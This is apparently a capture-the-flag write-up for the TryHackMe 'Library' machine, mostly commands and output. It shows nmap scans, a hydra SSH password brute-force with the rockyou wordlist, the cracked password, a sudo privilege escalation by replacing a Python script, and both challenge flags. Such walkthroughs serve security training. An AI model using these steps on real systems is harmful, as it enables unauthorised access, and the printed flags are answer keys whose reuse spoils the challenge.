@@ -1,0 +1,80 @@
+Today we have another easy challenge from TryHackMe which is Library 
+
+
+Main IP :: 10.49.144.135
+
+Performing all port scan via nmap.
+
+Nmap scan report for ip-10-49-144-135.ap-south-1.compute.internal (10.49.144.135)
+Host is up (0.00037s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Performing service and version detection scan.
+
+Nmap scan report for ip-10-49-144-135.ap-south-1.compute.internal (10.49.144.135)
+Host is up, received echo-reply ttl 64 (0.00047s latency).
+Scanned at 2026-06-02 03:46:04 UTC for 6s
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/X/Zd2/Rc7PrxR+K9bGX9i7Imk3JlU274UsMqM6X03THehc6XUvg0URMryl9IldYLjQvD0fadIg1jB8rCxqzRiJi35nw7ICUXnpZryDS/guLb94Sb9IrLWBTNNdUWV7bTb4gMaGHdyQAmKY62FgL2aKUFMn8SpxJu0WiVIQgcKkv15s17rNqVD39kG8x/bfdftcjn/YtEP09Sy4z1FqXF9FT1xWKaVr3Pd5rCAU4rpOzVpS+qTj77NWaXNDlcg3aCRaILD+4lquq8kVAA+VcXR9IwXOTKJRzRCMfYwd3M6QC45LlRa17xvhI++vBtCcGwxuD9JZsXu0Cd/5fdisrl
+|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI8Oi4FyiWylek0a1n1TD1/TBOi2uXVPfqoSo1C56D1rJlv4g2g6SDJjW29bhodoVO6W8VdWNQGiyJ5QW2XirHI=
+|   256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOPQQrT4KT/PF+8i33LGgs0c83MQL1m863niSGsBDfCN
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Welcome to  Blog - Library Machine
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD POST
+| http-robots.txt: 1 disallowed entry 
+|_/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Moving furhter and starting enumeration the directiores and files.
+
+SO within the robots.txt we see useragent; rockyou let's try it out\
+
+
+Also we will directly try for brute force as we can see username meliodas overhere.
+
+ hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.49.144.135
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-02 03:54:44
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking ssh://10.49.144.135:22/
+[STATUS] 156.00 tries/min, 156 tries in 00:01h, 14344244 to do in 1532:31h, 14 active
+[22][ssh] host: 10.49.144.135   login: meliodas   password: iloveyou1
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 1 final worker threads did not complete until end.
+[ERROR] 1 target did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-02 03:56:58
+root@ip-10-49-96-43:~# 
+
+
+and we have the password let's go with this and we login and can read user.txt 6d488cbb3f111d135722c33cb635f4ec
+
+TIME FOR PRIVILEGE ESCALATION::
+
+ sudo -l
+Matching Defaults entries for meliodas on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User meliodas may run the following commands on ubuntu:
+    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
+    
+Just remove bak.py and enter your own create bak.py to be root.
+
+sudo /usr/bin/python3 /home/meliodas/bak.py
+cat /root/root.txt 
+e8c8c6c256c35515d1d344ee0488c617
+root@ubuntu:~# 
